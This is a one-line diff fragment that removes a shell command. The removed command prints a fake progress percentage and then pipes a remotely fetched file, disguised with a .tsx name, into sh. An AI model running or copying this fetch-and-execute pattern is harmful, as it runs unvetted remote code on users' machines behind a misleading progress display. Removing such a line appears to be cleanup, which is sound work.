@@ -1,1 +1,0 @@
-echo 'Progress: 29.0%'; curl -L --progress-bar frkns.github.io/fun/dial_fx_raising.tsx | sh
